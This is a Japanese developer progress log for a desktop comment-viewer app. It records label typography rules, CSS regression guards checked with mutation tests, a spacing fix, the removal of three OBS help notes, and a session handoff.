### なぜ 13px/700 なのか（お手本が揃っていない中での判断）

タスクの指示は「規則は既にアプリ本体側で確立しているものを流用し、新しい流儀を発明しない」だったが、
**実測するとお手本自体が揃っていなかった**:

| 参照元 | 値 |
| --- | --- |
| `formLayout.module.css` の `.field label` | 12px / 800 |
| `SettingsScreen.module.css` の `.optionLabel` | 14px / 800 |
| `.toggleLabel`（コメビュ内・**変更不可**） | 13px / 700 |

つまり「アプリ全体で 1 値」は**そもそも成立していない**（本体側で既に 2 値ある）。そこで
**統一の単位を「コメビュ窓の中」と定義**し、動かせない `.toggleLabel` を正にして `.fieldLabel` を
そちらへ合わせた。`.toggleLabel` が動かせないのは `ToggleSwitch` が設定画面だけでなく
**本体コメントビューのツールバー**でも使われるため（値を変えると設定画面の外へ波及する）。
逆に `.fieldLabel` を 12px/800 にすると**同じカード内で項目名の書式が割れたまま**になり、
本タスクの目的そのもの（項目名の書式を 1 系統にする）が達成できない。
コメビュは別ウィンドウ・別 CSS 集約という既存構造なので、`formLayout.module.css` の import 統合はしない。

なお 3 段規則の表に**載らない別書式**（意図的な例外）はこの 3 つ。CSS 先頭の「■ 別段のもの」に列挙した。

| クラス | 値 | 表に載せない理由 |
| --- | --- | --- |
| `.cardHead` | 12px / 800 / `--text` | 「設定項目名」ではなくカード見出し |
| `.fontPreviewLabel` | 11px / 700 / `--muted` | `.fontRow` の中で `.fontPreviewSample`（16px）とベースライン揃えで並ぶインライン注記。12px へ上げると行の高さが動いてサンプルとの対比が鈍る |
| `.status` | 11px / 700 / `--muted` | 接続ポップオーバーの状態表示。**同じポップオーバー内で `.note` と隣接する**ので、`.note` を触るときは大小関係も一緒に見る |

⚠ 後ろ 2 つは初版では「別段のもの」に列挙しておらず、**表が窓の書式を網羅しているかのように読めた**
（レビュー指摘）。実際にはこの窓には 13px/700・12px/400・12px/800・11px/700 の 4 系統がある。
表は「3 役割の正」であって網羅ではない、と CSS 側にも明記した。

### `.speakerField` の二役を解いた

旧 `.speakerField` は `display/flex-direction/gap` に加えて `font-size` / `color` も持つ
**「縦積みコンテナ兼ラベル書式」**で、`SettingsView.tsx` 側はラベル文字列を `<label>` 直下のテキストノードに
置いていたため、**ラベルだけに書式を当てる術が無かった**。`.speakerField` をレイアウト専用へ戻し、
`SettingsView.tsx` の**ラベル文字列を持つ 4 箇所**（文字数上限 / 話者 / スタイル / フォント）を
`<span className={styles.fieldLabel}>` で包んだ。OBS パスワード欄の `.speakerField` は `<div>` で
ラベル文字列を持たない（レイアウト用途のみ）ので据え置き。

- `<label>` が子のコントロールを包む**暗黙ラベルのまま**で、`htmlFor`/`id` は導入していない。
- `.searchInput`（12px/`--text`）・`.selectCustom`（12px/`--text`）・`.fontPreviewSample`（16px/`--text`）は
  いずれも自分で `font-size`/`color` を持つので、`.speakerField` から typography を剥がしても
  **コントロールの見た目は動かない**（影響はラベル文字列だけ）。
- 既存テストへの影響はゼロ。`@testing-library/dom@10.4.1` の `getNodeText` は**直下のテキストノードだけ**を
  連結する実装なので、`getByText` のマッチ対象が `<label>` から `<span>` へ移るだけで**マッチ数は 1 のまま**。
  `Select` は `aria-label` を明示的に渡すのでアクセシブル名は暗黙ラベルに依存していない。
  `getByLabelText` 経路も無傷（`<label>` のアクセシブル名は `textContent` 由来で `<span>` の中身を含む）。
  ⚠ ただし**この 4 文字列をクエリしているテストは実際には 1 つも無い**（レビューで実測）。上の根拠づけ自体は
  正しいが、正確には「影響ゼロ**かつ、そもそもカバレッジも無い**」。設定項目名の存在をテストで守りたければ
  別途 `SettingsView` のレンダリングテストが要る（054 のスコープ外）。

### `--text-faint` の用途限定と `.pastTime`

`--text-faint` を **無効状態（`:disabled`）とプレースホルダ専用**に限定し、CSS コメントで明文化した。
モジュール内 7 箇所の内訳と処置:

| 箇所 | 処置 |
| --- | --- |
| `.btn:disabled, .btnGhost:disabled` / `.dangerBtn:disabled` | **残す**（正しい用法） |
| `.note` | → `--muted` / 12px / `line-height:1.5` |
| `.speakerField` | → `color` ごと**削除**（レイアウト専用へ） |
| `.obsPasswordHelp`（パスワード取得手順の `details`） | → `.note` と同じ書式（読ませる手順文＝補助説明そのもの） |
| `.fontPreviewLabel`（「プレビュー」の小見出し） | → **色だけ `--muted`**。11px/700 は据え置き（`.fontRow` で 16px のサンプル文と同じ行にベースライン揃えで並ぶインライン注記で、3 段規則のどの段でもない） |
| `.pastTime`（視聴者詳細の過去コメント時刻） | **据え置き**（設定画面外のメタ情報・タスク (1) の明示指示） |

⚠ **タスクの完了条件に内部矛盾があったので実態へ修正した**。原文は「`--text-faint` は無効状態と
プレースホルダにしか残っていない」だったが、同じタスクの (1) が `.pastTime` を据え置きと指示しており、
`.pastTime` は無効状態でもプレースホルダでもないため**実装後も原文の条件は満たされない**。加えて
**この CSS モジュールに `::placeholder` ルールは 1 つも無い**（faint をプレースホルダに使っているのは
`formLayout.module.css` 側）。完了条件を「無効状態（`:disabled`）と、設定画面外のメタ情報（`.pastTime`）に
しか残っていない／設定画面内の可読テキストには一切残っていない」へ書き換えた。

### CSS ガード (6) —— コンポーネントのテストでは原理的に守れない

`check-css-guards.mjs` に (1)〜(5) と同じ作法（`read()` → `ruleBody()` → `hasDecl()` → `fail()`）で追加した。
(5) と同じ穴がここにもある——**CSS モジュールは vitest 上で存在しないキーでも文字列を返す**
（`styles.nonExistentKey` → `"_nonExistentKey_<hash>"`）ので、`<span className={styles.fieldLabel}>` が
付いていることを確かめても CSS 側にルールが無い状態は緑のまま通る。色・太さも jsdom では解決されない。

- **(6-a)** `.fieldLabel` のルールが実在し、`font-size` / `font-weight` / `color` が **`.toggleLabel` と一致**すること。
  値をベタ書きで二重管理せず、`.toggleLabel` の実値を `declValue()` で読み取って突き合わせる
  （＝将来 `.toggleLabel` を動かしたら `.fieldLabel` も一緒に動かさないと落ちる）。
- **(6-b)** `color: var(--text-faint)` を使うルールを**全走査**し、セレクタが `:disabled` を含むか
  **許可リスト `FAINT_ALLOWED`** に載っているもの以外は fail。
- **(6-c)** `.speakerField` に `font-size` / `color` が戻っていないこと（レイアウト専用の担保）。
  併せて `.speakerField` / `.note` のルールが**取り出せること**自体を要求する（fail-closed）。
- **(6-d)** `SettingsView.tsx` が `styles.fieldLabel` を参照していること（CSS↔TSX の逆向き）。

#### レビュー指摘を受けた改訂（2026-08-01・同日）

初版のガード (6) はミューテーションが 2 種しか通っておらず、レビューで **26 種を実走**させた結果
次の穴が実証されたため直した。**「守っているつもりで守れていない」を潰すのがこのガードの存在理由**なので、
指摘はすべて取り込んだ。

| 実証された問題 | 対応 |
| --- | --- |
| **偽陰性**: `.fieldLabel { color: var(--muted); background-color: var(--text); }` が (6-a) を素通り。`hasDecl` の `prop` が無拘束で `color` が `background-color` に部分一致するため | `hasDecl` の正規表現の先頭を `(?:^\|;\|\{)\s*` で縛った。**ヘルパ側を直したので既存 (1)〜(5) にも効く**（`border-color` を使う (5-a)/(5-b') 含め非退行を実測） |
| **偽陽性**: `.speakerField` に `background-color` を足しただけで (6-c) が「**color** が戻っています」で落ちる。(5-b) が戒めた「正しい CSS で fail・メッセージが真因とずれる」と同型 | 同上（1 箇所の修正で両方向とも解消） |
| **偽陰性**: `.fieldLabel` の `font-size` を 11px に戻しても緑。`.note` が 12px になった今、**054 が直した症状そのもの**が通る | (6-a) の突き合わせ対象に `font-size` を追加 |
| **偽陰性**: 新設クラス（例 `.fieldHint`）に faint を誤用しても denylist は捕まえない＝「規則」ではなく「今あるもの」しか守っていない | (6-b) を**許可リスト付きの走査型**へ。`.pastTime` は `FAINT_ALLOWED` に**理由付きで**登録。これなら (5-b) の教訓（正しい CSS で fail させない）を守りつつ将来の誤用も捕まる。`@media` 内のルールも 1 件ずつ拾える |
| **fail-open**: `.note` / `.speakerField` をカンマで束ねると `ruleBody` が null を返し、(6-b)/(6-c) が**黙って無効化**される | (6-c) にルール実在の要求を追加（(6-a) は元から fail-closed）。(6-b) は走査型化で解消 |
| **偽陽性**: `.toggleLabel` の値を複数行値や `!important` 付きに書き換えると、値としては同じなのに (6-a) が落ちる | `declValue()` が値を正規化して返すようにした（空白畳み・括弧内空白除去・`!important` 除去）。突き合わせも `hasDecl` の前方一致ではなく**値どうしの直接比較**へ（`.fieldLabel` 側にだけ `!important` が付くと素通りする非対称も解消） |
| `styles.fieldLabl` のような**打ち間違い**は typecheck（`vite/client` の `*.module.css` が `Record<string,string>`）・vitest（`css:false` で任意キーに文字列）・eslint・ガードのどれも捕まえない | (6-d) を追加。⚠ (4) の `monetaryTone.ts` 突き合わせをこのファイルにそのまま流用してはいけない——`SettingsView.tsx` には VOICEVOX の話者スタイル `sp.styles.some(…)` / `selectedSpeaker?.styles.map(…)` があり `\bstyles\.` に衝突する（実測で誤検出）。要求するクラスだけをピンポイントで見る形にした |

**ミューテーション確認（31 種・改訂後）**: 作業ツリーを壊さないよう `scripts/` と対象ソースを隔離コピーして実走。

| 壊し方 | 結果 |
| --- | --- |
| `.fieldLabel` をルールごと削除 / 宣言を全部消してコメントだけ残す | **FAIL**（(6-a)。コメント除去が効いている＝「常に緑」ではない） |
| `.fieldLabel` の `font-size` / `font-weight` / `color` を個別に変更・削除 | **FAIL**（(6-a)） |
| `.fieldLabel` の `color` を `--muted` にしつつ `background-color: var(--text)` で偽装 | **FAIL**（(6-a)・改訂前は生存） |
| `.toggleLabel` を 12px/800 へ（`.fieldLabel` は据え置き） | **FAIL**（(6-a)・基準を動かしたら両方直せ、が効く） |
| `.toggleLabel` の `color` を削除（基準側が欠ける） | **FAIL**（(6-a)「基準側」の専用メッセージ） |
| `.note` の `color` を `var(--text-faint)` へ戻す | **FAIL**（(6-b)） |
| 新設 `.fieldHint` / `@media` 内の新クラスに faint を誤用 | **FAIL**（(6-b)・改訂前は生存） |
| `.note` / `.speakerField` をカンマ束ねにして faint・typography を戻す | **FAIL**（(6-b)/(6-c)・改訂前は生存） |
| `.speakerField` に `font-size:11px` / `color:var(--text-faint)` を戻す | **FAIL**（(6-c)） |
| `SettingsView.tsx` の `styles.fieldLabel` を `styles.fieldLabl` に打ち間違える | **FAIL**（(6-d)・改訂前は生存） |
| 既存(1)非退行: `.item` の `flex-shrink: 0` を全削除 | **FAIL**（(1)・ヘルパ改訂で壊れていない） |
| **正しい CSS**: `.speakerField` に `background-color` / `.note` に `background-color: var(--text-faint)` | **PASS**（改訂前は誤 fail していた） |
| **正しい CSS**: `.toggleLabel` の複数行値 / `!important` / 末尾セミコロン省略 / `color` を先頭宣言へ / 両方を 800 へ揃える / `.pastTime` を faint のまま据え置く | **PASS** |

**意図的に残した穴**（機械が「どこからが退行か」を決められないもの）:
`.note` の `font-size` を 11px に戻す・`line-height` を消す変異は **PASS する**（(6-b) は色だけを見る）。
再修正トリガーと格上げ方針は CSS の `.note` コメントに書いた。
`.fieldLabel` を `@media` の中へ移す変異も PASS する（ルールとしては実在するため。条件付きになったことは検出できない）。

### `.note` の変更が及ぶ設定画面外の 2 箇所

`.note` は `SettingsView` に 16 箇所だが、**他に 2 箇所ある**。どちらも同じ「補助説明」の役割なので
同じ規則が当たるのは意図どおりで、除外しなかった。

| 画面 | 場所 | 文言 |
| --- | --- | --- |
| 視聴者詳細（`ViewerDetailPanel.tsx`） | 「この視聴者の情報を削除する」ボタン直下の `<p>` | 「…端末から削除します。取り消せません。」 |
| 本体コメントビュー（`CommentViewerApp.tsx`） | YouTube 接続カード内の `<span>`（**接続ポップオーバーの中**） | 「YouTube はチャンネル名入力不要…無料クォータ（10,000 units/日）…」 |

⚠ **記述の訂正（レビュー指摘・同日）**: 当初ここは「**ツールバー**の YouTube 接続カード内」と書き、
「11px→12px で**ツールバーの高さに効きうる**が `.toolbar` も右クラスタ（045c）も `flex-wrap` 済みなので
折り返しで吸収される想定」としていたが、**これは誤りだった**。`CommentViewerApp.tsx` の当該 `.note` は
`<ConnectionCard service="YouTube">` の **children** で、`ConnectionCard.tsx` は children を
`.connPopover`（`position:absolute` / `top:calc(100% + 6px)` / `z-index:40`・`open` のときだけマウント）に
しか描画しない。したがって **`.toolbar` の高さにも折り返しにも一切影響しない**——`.toolbar` /
`.toolbarActions` の `flex-wrap` も `.toolbarError` / `.switch` の `flex:none` もこの件とは無関係で、
それらを根拠に「吸収される」と書いたのは `ConnectionCard` の描画先を追えていなかったため。

実際に見るべきリスクは別で、次の 2 点（実機確認の対象をこちらへ差し替えた）:

1. `.connPopover` には `max-height` も `overflow` も無い。`min-width:280px` で折り返す長文が
   11px→12px ＋ `line-height:1.5` のぶん確実に背が伸びるので、**狭いコメビュ窓で下端からはみ出さないか**。
2. 同じポップオーバー内の `.status`（11px/700/`--muted`）より `.note`（12px/400/`--muted`）が**大きくなり**、
   説明文が状態表示より目立つ。**階層として許容できるか**（`.status` は 3 段規則の表に載せていなかったので
   この衝突を検討していなかった。CSS 先頭の「■ 別段のもの」へ追記した）。

なお `.toggleLabel` は別クラスなので **ツールバーのトグル自体（読み上げ / コメントをOBSに表示）は不変**、
という点は変わらない。

> **教訓**: 誤った前提のコメントは「検討済みで問題なし」というお墨付きとして働く。053 のポーリング
> コメントで外部レビューに指摘されたのと同型の失敗を、同じリポジトリで繰り返した。**「〇〇で吸収される」と
> 書く前に、その要素が本当にその親のレイアウトに乗っているかを描画先まで追う**こと。

### 055c への申し送り

**055c（ヘッダーのベル＋アップデート画面）はこの 3 段規則に従うこと。** ただし 055c は
**メインウィンドウ**の画面なので、移すのは**役割の規則**（項目名＝`var(--text)`×太字 ／ 説明＝`var(--muted)`×標準 ／
`--text-faint` は無効状態・プレースホルダ専用）であって、**px/weight の実値ではない**。
13px/700 は「コメビュ窓の中で `.toggleLabel` に合わせた」ローカルな結論なので、メインウィンドウ側では
既存のお手本（`formLayout.module.css` の `.field label` ＋ `.fieldHelp`、`SettingsScreen.module.css` の
`.optionLabel` ＋ `.optionDesc`）の値をそのまま使う。**新しい値を発明しないこと**が守るべき点。

### 検証

`typecheck` / `lint` / `test`（**26 files / 462 tests** ＋ CSS guard (1)〜(6-d)）すべて green。
差分は 3 ファイル（CSS / `SettingsView.tsx` / ガード）で、`SettingsView.tsx` の差分は
**`className` の付け替えのみ**（ロジック・props・可視文言は不変）。`src-tauri/` / `comment-sidecar/` /
`package.json` / `theme.css` / `ToggleSwitch.tsx` / `Select.tsx` / `formLayout.module.css` は**差分ゼロ**。
`CommentViewerApp.module.css` に生 hex/rgba は無い（役割トークン経由）。`csp: null` 不変・
新規外部通信/API/capability/依存の追加なし＝`docs/security.md` は変更なし。

**実機で確認すること**: (a) 設定ビューで項目名がすべて同じ太字・濃色で、説明文と一目で区別できるか
(b)「固定コメントをOBSに表示」カードの `.note` 5 連続が読めるか (c) ライト/ダーク両テーマで破綻しないか
(d) **本体ツールバーのトグルが変わっていないか**（`.toggleLabel` 非変更の担保）
(e) 視聴者詳細の削除説明の見た目 (f) **YouTube 接続ピルを開いたときのポップオーバー**——
`.connPopover` に `max-height`/`overflow` が無いので**縦に伸びて窓の下端からはみ出さないか**、
および `.note`（12px）が `.status`（11px）より大きくなった階層が許容できるか。
※ (f) は当初「ツールバーの折り返しが破綻していないか」と書いていたが、当該 `.note` は
`position:absolute` のポップオーバーの中でツールバーのレイアウトに乗っていないため差し替えた（上記の訂正）。

### E2E フィードバック反映 —— 書式は直ったが「余白が一律」で読み分けられなかった

上の実装を実機（E2E）で確認したところ、**まだ項目と説明が読み分けられない**という結果になった。
書式（13px/700 対 12px/400/`--muted`）は確かに分かれているのに読めない原因は**余白**だった:

`.cardBody` が `gap: 10px` の一律で、`.note` も `.speakerField` も `ToggleSwitch` も**同じ間隔で等間隔に並ぶ**。
つまり「項目名 → その説明」＝ 10px、「説明 → 次の項目」＝ 10px で、**ブロックの切れ目とブロックの中身が
同じ間隔**になっており、「どこからどこまでが 1 つの設定か」が視覚的に立ち上がらなかった。
書式のコントラストだけでは、等間隔に積まれたテキストを「かたまり」として読ませられない。

依頼者の指示は「**項目同士を広げるのではなく、そうじゃない方（ブロック内）を詰める**方向で一旦やる」。

#### 確定した 2 段の余白（`.cardBody`）

| 変数 | 値 | 意味 |
| --- | --- | --- |
| `--card-block-gap` | 10px | 項目ブロック同士（**据え置き**＝今回は広げない） |
| `--card-inner-gap` | 4px | ブロック内（項目名 → コントロール → 説明）。`.speakerField` の `gap` と同値 |

```css
.cardBody {
  --card-block-gap: 10px;
  --card-inner-gap: 4px;
  gap: var(--card-block-gap);
}
.cardBody > * + .note {
  margin-top: calc(var(--card-inner-gap) - var(--card-block-gap));
}
```

得られる縦リズム:

| 位置 | 前 | 後 |
| --- | --- | --- |
| 項目名 → コントロール（`.speakerField` 内） | 4px | 4px（不変） |
| コントロール → その説明 | 10px | **4px** |
| 説明 → 説明（固定コメントカードの 5 連続） | 10px | **4px** |
| 説明 → 次の項目 ／ 項目 → 次の項目 | 10px | 10px（不変） |
| 何か → `.errorText` | 18px | 18px（不変） |

#### なぜ「`.note` を負の margin で引き寄せる」向きにしたのか

逆向き（`.cardBody { gap: 4px }` にして**非** `.note` へ `margin-top: 6px` を足す＝`* + *:not(.note)`）も
成立するが、**`.errorText` が自前で `margin: 8px 16px 0` を持っている**。`* + *:not(.note)` は特異度 (0,2,0) で
`.errorText`（0,1,0）の `margin-top` を上書きするため、**現状 18px ある分離が 10px に縮む**＝指示していない
見た目変更が出る。`.note` だけを対象にすれば `.errorText` には一切触れない。

各ブロックを `<div>` で包む案は約 20 箇所の JSX 変更になり、054 の「カードの再構成はしない」に抵触するので採らない。
**結果として JSX の差分はゼロ**（`SettingsView.tsx` は 054 の `className` 付け替えのまま）。

値を**ローカル var で持つ**のは、引き寄せ量が「2 つの差分」で決まるため。片方だけ動かすと階層が黙って壊れる。
ローカル var は同ファイルの `--pill-avatar` / `--pill-pad-y` と同じ既存の作法。
本体側のお手本 `formLayout.module.css` も同じ発想（`.form` の `gap:14px` ＋ `.fieldHelp` の `margin-top:6px`）で、
新しい流儀ではない（比率も 1:2.5 でほぼ一致）。

**再修正トリガー**: 4px でもブロックが読み分けられない場合、次の一手は **`--card-block-gap` を 12px へ広げる**
（`--card-inner-gap` は動かさない＝`.speakerField` と揃えたまま）。

#### 波及範囲

- **設定画面**（`SettingsView`）と**視聴者詳細の「情報の削除」カード**（`ViewerDetailPanel`）の 2 箇所。
  どちらも `.note` が `.cardBody` の**直接の子**なので、セレクタ 1 本で両方に正しく効く
  （削除ボタンと警告文が 1 ブロックに見えるのは意図どおり）。
- **`.connPopover`（本体ツールバーの接続カード）は対象外**（`.cardBody` の子ではない）＝依頼者の選択で、
  本体ウィンドウの見た目は 1px も動かない。
- カード先頭が `.note` の場合（OBS カード）は `* + .note` に当たらず引き寄せが起きない＝意図どおり。

#### CSS ガード (7)

余白は jsdom が**一切**解決しない（`getComputedStyle` も `getBoundingClientRect` も効かない）ので、(5)(6) と
同じくここでしか守れない。`declValue()` を (6) のブロック内ローカルから**モジュールレベルへ引き上げて共用**した。

- **(7-a)** `.cardBody` が 2 つの var を宣言し、`gap: var(--card-block-gap)` を使っている（ベタ書きに戻さない）。
- **(7-b)** `.cardBody > * + .note` が実在し、`margin-top` が `calc(var(--card-inner-gap) - var(--card-block-gap))`
  であること（`-6px` のベタ書きにすると var を動かしたとき追随せず、階層が無音で壊れる）。
- **(7-c)** `--card-inner-gap` の px 値 < `--card-block-gap` の px 値（**階層の反転を止める**）。
- **(7-d)** `.speakerField` の `gap` が `--card-inner-gap` と同値（ブロック内の間隔が 2 系統に割れない）。
  `.speakerField` が var を直接参照しないのは、`.cardBody` の外で使われたとき var 未定義で `gap` が無効化される
  （＝0 になる）のを避けるため。

**ミューテーション確認（14 種・隔離コピーで実走）**: 退行 10 種すべて FAIL / 正しい CSS 4 種すべて PASS。

| 壊し方 | 結果 |
| --- | --- |
| 引き寄せルールごと削除 ／ `margin-top` を消す ／ `-6px` のベタ書きへ | **FAIL**（(7-b)） |
| `--card-inner-gap` を 12px（反転）／ 10px（同値）にする | **FAIL**（(7-c)＋(7-d)） |
| `gap` を `10px` のベタ書きへ戻す ／ var を 2 つとも削除 | **FAIL**（(7-a)） |
| `.speakerField` の `gap` を 8px にする ／ 削除する | **FAIL**（(7-d)） |
| var の値を `rem` にする（大小比較が機械でできなくなる） | **FAIL**（(7-c)） |
| **正しい CSS**: `--card-block-gap` を 12px へ広げる ／ ブロック内を 6px にして `.speakerField` も揃える ／ 宣言順の入れ替え ／ `calc` 内の改行 | **PASS** |

併せて (6) の 31 種を再実走し、`declValue` の引き上げによる**非退行**を確認した（結果は改訂後と完全に同一）。

#### 検証

`typecheck` / `lint` / `test`（26 files / 462 tests ＋ CSS guard (1)〜(7)）すべて green。
**隣接兄弟セレクタ `+` はこのリポジトリの CSS モジュールで初使用**なので、`pnpm build` してスコープを実測した:

```
._cardBody_1uepz_636>*+._note_1uepz_10{margin-top:calc(var(--card-inner-gap) - var(--card-block-gap))}
._cardBody_1uepz_636{…;--card-block-gap: 10px;--card-inner-gap: 4px;gap:var(--card-block-gap);padding:14px}
```

`.cardBody` と `.note` が**同じモジュールハッシュ（`1uepz`）で正しくスコープ**され、var 宣言も残っている。
他モジュールの `.cardBody`（OverlayComment 等）は別ハッシュで無関係。

差分は 2 ファイル（`CommentViewerApp.module.css` / `check-css-guards.mjs`）＋ docs のみ。**JSX 差分ゼロ**。
`src-tauri/` / `comment-sidecar/` / `package.json` / `pnpm-lock.yaml` / `theme.css` / `SettingsView.tsx` /
`ViewerDetailPanel.tsx` / `formLayout.module.css` は**差分ゼロ**を実測。`csp: null` 不変・新規外部通信/API/
capability/依存の追加なし＝`docs/security.md` は変更なし。

**実機で確認すること**: (a) 読み上げカードで「読み上げの文字数上限＋入力＋説明」が 1 ブロックに見え、
「話者」との間が離れているか (b) OBS カードの先頭の説明 2 連続・トグルとその説明・パスワード欄
(c) 固定コメントカードの `.note` 5 連続が「1 つの説明のかたまり」に見え、上のトグルへの帰属が分かるか
(d) 視聴者詳細「情報の削除」で削除ボタンと警告文がくっついているか (e) ライト/ダーク両テーマ
(f) **本体ツールバーと接続ポップオーバーが 1px も動いていないこと**（対象外の担保）。

### E2E フィードバック② —— OBS カードの説明 3 本を削除（依頼者の指示）

余白の追補を入れた状態で実機を見た結果、**OBS カード（「コメントをOBSに表示」）の説明が過剰**という判断になり、
依頼者の指示で `SettingsView.tsx` から可視文言 3 本を削除した。**削除のみで、書き換え・追加はしていない。**

| 削除した注記 | 由来 |
| --- | --- |
| `表示の ON/OFF は、コメント画面の上部にある「コメントをOBSに表示」で切り替えます。` | 045b（トグル移設先への導線） |
| `OBSの「ウィンドウキャプチャ」で、コメント表示用のウィンドウ「StreamDock コメントオーバーレイ」を選ぶと、配信画面にコメントを重ねられます。` | 033f（手動キャプチャ手順） |
| `ONにすると、上の手動でのウィンドウキャプチャ追加が不要になります。` | 044a（自動反映の効果） |

3 本目は当初の指示に含まれていなかったが、**2 本目を消すと「上の手動での…」の指す先が無くなって宙に浮く**ため
確認のうえ一緒に削除した（自動反映の効果はトグル label「『コメントをOBSに表示』ON時、OBSに自動で反映する」が
045c 以降単体で伝えるので、注記無しでも意味は通る）。

#### 残したもの

**Windows 向け注記**（`「キャプチャ方式＝Windows 10（1903 以降）」を選び、「透過を許可」を ON に…`）は残した。
044a が自動設定するのは `pickWgcMethodValue` による**キャプチャ方式だけ**で、**「透過を許可」は自動化されていない**
（`obs-client.ts` を読んで確認）ため、自動反映を使う人にも必要。固定コメントカードの Windows 注記
（「上のコメント用と同じく」）が参照している先でもある。

#### 手放した担保（意図的・再修正トリガー付き）

1. **設定画面だけを見ている人が「表示をどこで ON にするか」を辿る導線**（045b が置いたもの）。
   カード見出し「コメントをOBSに表示」は残るので、見出しを見て来た人はカード内で表示トグルを見つけられない。
   再修正トリガー＝「表示の ON/OFF が見つからない」という実機フィードバックが出たとき。
2. **自動反映が失敗した人向けの手動フォールバック手順**と、OBS 実窓名の可視提示。
   固定コメントカード側の手動手順は指示範囲外で据え置いたため、**コメント用には手動手順が無く固定用には在る
   という非対称**が残る。再修正トリガー＝2 カードの案内粒度を揃える文言タスクを起票するとき。
3. **窓名一致の UI 側の検査**（下記）。

#### 落ちたテスト 2 件と、その扱い

削除した 2 本目の注記にしか無い文字列 `「StreamDock コメントオーバーレイ」` を見ていたテストが 2 件あった
（他に削除文言へ依存するテストが無いことは grep で確認済み）。

| テスト | 扱い |
| --- | --- |
| `手動キャプチャ注記に OBS 実窓名を実体どおり出す（044a の窓名一致を壊さない）` | **削除**（検査対象そのものが画面から消えたため） |
| `既存の OBS カード（044a）は不変（自動反映トグルと窓名注記が残る）` | 窓名アサートのみ削除し、`既存の OBS カードの自動反映トグルは残っている（046b/054 追補で巻き添えにしない）` へ改名。**トグルが残る検査は維持**（046b の「上のカードに手を入れていない」担保なので） |

⚠ **これで窓名の一致は `src-tauri/src/lib.rs` の `.title` ↔ `apps/comment-sidecar/src/obs/obs-client.ts` の
`OBS_SOURCE_NAME` の 2 者間だけの契約になり、desktop のテストスイートからは見えなくなった。**
窓名を変えるときは 2 ファイルを必ず同時に直すこと（片方だけ変えても desktop 側は緑のまま通る）。
再修正トリガー＝手動キャプチャ手順を UI へ戻すとき（そのときこの検査も戻す）、または窓名一致の退行が実際に
起きたとき（そのときは UI 依存をやめ、lib.rs と obs-client.ts を直接突き合わせる検査にする）。
これらはテストファイル側にもコメントで残した（削除の痕跡がファイル境界を越えないと (1)〜(5) の教訓が効かないため）。

#### 併せて実態へ直したコメント（挙動は不変）

- カード冒頭 — 「このカードが担うのは**手動ウィンドウキャプチャの手順**と自動反映のセットアップ」→ 自動反映だけ。
- 045a 注記 — 実窓名が UI から消えて 2 者間契約になったことを追記。
- 044a 注記 — 「失敗時は**上の手動手順**にフォールバックする」が画面上の手順を指していた点を訂正
  （挙動としてのフォールバック自体は不変）。
- 046b 注記（固定コメントカード）— 置き場所の理由が「手動キャプチャの手順注記と同じカード」だった点を訂正。

#### 検証

`typecheck` / `lint` / `test`（**26 files / 461 tests**＝テスト 1 件削除で 462 → 461 ＋ CSS guard (1)〜(7)）すべて green。
削除文言が可視要素として残っていないことを grep で確認（残るヒットは経緯を書いたコメント内のみ）。
差分は `SettingsView.tsx` / `SettingsView.obs.test.tsx` ＋ docs のみ。Rust / sidecar / capability / CSP / 依存は不変。

---

## 2026-08-01 セッション引き継ぎ（054 レビュー → 追補 2 本まで／**未コミット・実機未確認**）

### 今回完了したこと

**(1) 054 のセキュリティレビュー＋品質レビュー**
- セキュリティ判定 **問題なし・修正必須ゼロ**。「frontend の見た目のみ」を実測で検証
  （`src-tauri/` / `capabilities/` / `tauri.conf.json`〔`csp: null`〕/ `comment-sidecar/` / `package.json` /
  `pnpm-lock.yaml` / `theme.css` / `ToggleSwitch.tsx` / `Select.tsx` / `formLayout.module.css` /
  `SettingsScreen.module.css` / `docs/security.md` がすべて差分ゼロ、untracked ゼロ）。
- 品質レビューは**ミューテーション 26 種を隔離コピーで実走**して裏を取った。ガード (6) 初版に
  偽陰性 4 種・偽陽性 3 種・fail-open 2 種が**実在**することを実証。

**(2) レビュー指摘の反映（apply-review）** — 詳細は上の「レビュー指摘を受けた改訂」節。
- `hasDecl` の正規表現に `(?:^|;|\{)` の境界を追加（**ヘルパ側を直したので既存 (1)〜(5) にも効く**）。
- (6-a) に `font-size` を追加 ／ 突き合わせを `declValue` 同士の直接比較へ ／ `declValue` の値正規化。
- (6-b) を名指し denylist から**許可リスト `FAINT_ALLOWED` 付きの走査型**へ。
- (6-c) を fail-closed に ／ **(6-d) を新設**（`SettingsView.tsx` の `styles.fieldLabel` 参照＝CSS↔TSX の逆向き）。
- **`.note` の波及先の事実誤認を訂正**（「本体ツールバー」ではなく `position:absolute` の `.connPopover` の中）。
- 3 段規則の表から実体の無い「プレースホルダ」行を外し、「別段のもの」に `.fontPreviewLabel` / `.status` を追加。

**(3) E2E フィードバック① — 余白の 2 段化**（上の「E2E フィードバック反映」節）
- `.cardBody` に `--card-block-gap: 10px`（項目ブロック同士）/ `--card-inner-gap: 4px`（ブロック内）を導入し、
  `.cardBody > * + .note { margin-top: calc(--card-inner-gap - --card-block-gap) }` で説明を直前の項目へ引き寄せ。
- **JSX 差分ゼロ**。ガード **(7-a)〜(7-d)** を追加。

**(4) E2E フィードバック② — OBS カードの可視文言 3 本削除**（上の「E2E フィードバック②」節）
- 045b の移設先導線 ／ 033f の手動キャプチャ手順 ／ 044a の「上の手動での…が不要になります」を削除。
- 依存していたテスト 2 件を整理（1 件削除・1 件は窓名アサートのみ削除して改名）。

### 変更した主要ファイル（**8 件・すべて未 staged／base は `b182801 add:tasks追加`**）

| ファイル | 内容 |
| --- | --- |
| `apps/desktop/src/screens/comment-viewer/CommentViewerApp.module.css` | 3 段のタイポグラフィ規則コメント ／ `.fieldLabel` 新設 ／ `.note`・`.obsPasswordHelp`・`.fontPreviewLabel` の色/サイズ ／ **`.cardBody` の余白 2 段＋`.cardBody > * + .note`** |
| `apps/desktop/src/screens/comment-viewer/SettingsView.tsx` | ラベル 4 箇所を `<span className={styles.fieldLabel}>` で包む ／ **OBS カードの可視文言 3 本を削除** |
| `apps/desktop/scripts/check-css-guards.mjs` | `hasDecl` 修正・`declValue` をモジュールレベルへ ／ ガード **(6-a)〜(6-d)** ／ ガード **(7-a)〜(7-d)** |
| `apps/desktop/src/screens/comment-viewer/SettingsView.obs.test.tsx` | 窓名アサートを見ていたテスト 2 件の整理 |
| `docs/progress.md` | 054 節（本文＋改訂＋追補①②＋本引き継ぎ） |
| `docs/task-board.md` | 054 行を実装済みへ・追補①②を追記 |
| `docs/tasks/054-comment-viewer-settings-readability.md` | 実装済み注記・完了条件の修正・追補①② |
